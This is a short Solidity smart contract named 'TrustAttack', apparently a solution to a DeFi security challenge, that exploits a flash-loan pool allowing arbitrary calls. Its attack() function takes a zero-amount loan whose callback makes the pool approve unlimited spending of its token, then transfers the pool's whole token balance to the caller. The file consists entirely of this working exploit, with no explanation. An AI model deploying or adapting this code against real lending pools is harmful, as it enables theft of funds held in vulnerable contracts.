// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";

interface ITLPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrustAttack {
    ITLPool immutable pool;
    ERC20 immutable token;

    constructor(address _poolAddr, address _token) {
        pool = ITLPool(_poolAddr);
        token = ERC20(_token);
    }

    function attack() external {
        // prepare the function signature of approve() erc20
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2 ** 256 - 1
        );
        // approve unlimited spending of token on pool
        pool.flashLoan(0, address(this), address(token), data);
        // send all the tokens from pool to the hacker
        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }
}
